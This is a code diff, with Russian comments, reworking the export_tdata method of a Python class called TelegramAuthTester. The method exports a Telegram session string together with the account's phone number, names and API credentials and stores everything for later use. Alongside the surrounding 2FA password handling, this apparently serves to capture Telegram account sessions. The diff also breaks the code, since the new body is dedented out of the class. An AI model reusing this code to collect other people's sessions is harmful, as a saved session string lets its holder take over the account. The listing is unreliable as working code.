@@ -418,79 +418,82 @@ class TelegramAuthTester:
             return {'success': False, 'error': 'Неверный пароль 2FA'}
     
     async def export_tdata(self, client, user_info, request_info=None):
-        """Экспорт TData - исправленная версия"""
-        try:
-            # Экспортируем session string
-            session_string = await client.export_session_string()
-            
-            # Получаем базовую информацию о клиенте
-            # В Pyrogram нет прямого доступа к auth_key, поэтому используем доступные данные
-            tdata_info = {
-                'version': '1.0',
-                'user_id': user_info['id'],
-                'phone_number': user_info.get('phone_number', ''),
-                'first_name': user_info.get('first_name', ''),
-                'last_name': user_info.get('last_name', ''),
-                'username': user_info.get('username', ''),
-                'session_string': session_string,
-                'dc_id': client.dc_id,
-                'api_id': self.api_id,
-                'api_hash': self.api_hash,
-                'device_model': 'Pyrogram Export',
-                'system_version': '1.0',
-                'app_version': '1.0',
-                'lang_code': 'en',
-                'system_lang_code': 'en',
-                'exported_at': datetime.now().isoformat(),
-                'session_type': 'pyrogram_string_session'
-            }
-            
-            # Сохраняем пользователя
-            storage.save_user(user_info)
-            
-            # Сохраняем сессию
-            session_data = {
-                'session_string': session_string,
-                'dc_id': client.dc_id,
-                'api_id': self.api_id,
-                'api_hash': self.api_hash,
-                'device_model': 'Pyrogram Export',
-                'system_version': '1.0',
-                'app_version': '1.0',
-                'lang_code': 'en',
-                'system_lang_code': 'en'
-            }
-            
-            session_id = storage.save_session(
+    """Экспорт TData - исправленная версия"""
+    try:
+        # Экспортируем session string
+        session_string = await client.export_session_string()
+        
+        # Получаем информацию о дата-центре
+        dc_info = await client.storage.dc_id()
+        dc_id = dc_info if dc_info else 2  # Значение по умолчанию
+        
+        # Получаем базовую информацию о клиенте
+        tdata_info = {
+            'version': '1.0',
+            'user_id': user_info['id'],
+            'phone_number': user_info.get('phone_number', ''),
+            'first_name': user_info.get('first_name', ''),
+            'last_name': user_info.get('last_name', ''),
+            'username': user_info.get('username', ''),
+            'session_string': session_string,
+            'dc_id': dc_id,  # Используем полученный dc_id
+            'api_id': self.api_id,
+            'api_hash': self.api_hash,
+            'device_model': 'Pyrogram Export',
+            'system_version': '1.0',
+            'app_version': '1.0',
+            'lang_code': 'en',
+            'system_lang_code': 'en',
+            'exported_at': datetime.now().isoformat(),
+            'session_type': 'pyrogram_string_session'
+        }
+        
+        # Сохраняем пользователя
+        storage.save_user(user_info)
+        
+        # Сохраняем сессию
+        session_data = {
+            'session_string': session_string,
+            'dc_id': dc_id,  # И здесь тоже исправляем
+            'api_id': self.api_id,
+            'api_hash': self.api_hash,
+            'device_model': 'Pyrogram Export',
+            'system_version': '1.0',
+            'app_version': '1.0',
+            'lang_code': 'en',
+            'system_lang_code': 'en'
+        }
+        
+        session_id = storage.save_session(
+            user_info['id'], 
+            session_data, 
+            request_info
+        )
+        
+        if session_id:
+            # Сохраняем полный TData
+            tdata_id = storage.save_tdata(
                 user_info['id'], 
-                session_data, 
-                request_info
+                session_id, 
+                tdata_info
             )
             
-            if session_id:
-                # Сохраняем полный TData
-                tdata_id = storage.save_tdata(
-                    user_info['id'], 
-                    session_id, 
-                    tdata_info
-                )
-                
-                logger.info(f"💾 TData сохранен. Session ID: {session_id}, TData ID: {tdata_id}")
-                
-                return {
-                    'success': True,
-                    'session_id': session_id,
-                    'tdata_id': tdata_id,
-                    'user_id': user_info['id'],
-                    'session_string': session_string,
-                    'message': 'TData успешно экспортирован в JSON хранилище'
-                }
-            else:
-                return {'success': False, 'error': 'Ошибка сохранения сессии'}
-                
-        except Exception as e:
-            logger.error(f"❌ Ошибка экспорта TData: {e}")
-            return {'success': False, 'error': f'Ошибка экспорта: {str(e)}'}
+            logger.info(f"💾 TData сохранен. Session ID: {session_id}, TData ID: {tdata_id}")
+            
+            return {
+                'success': True,
+                'session_id': session_id,
+                'tdata_id': tdata_id,
+                'user_id': user_info['id'],
+                'session_string': session_string,
+                'message': 'TData успешно экспортирован в JSON хранилище'
+            }
+        else:
+            return {'success': False, 'error': 'Ошибка сохранения сессии'}
+            
+    except Exception as e:
+        logger.error(f"❌ Ошибка экспорта TData: {e}")
+        return {'success': False, 'error': f'Ошибка экспорта: {str(e)}'}
 
 # Инициализация
 auth_tester = TelegramAuthTester()
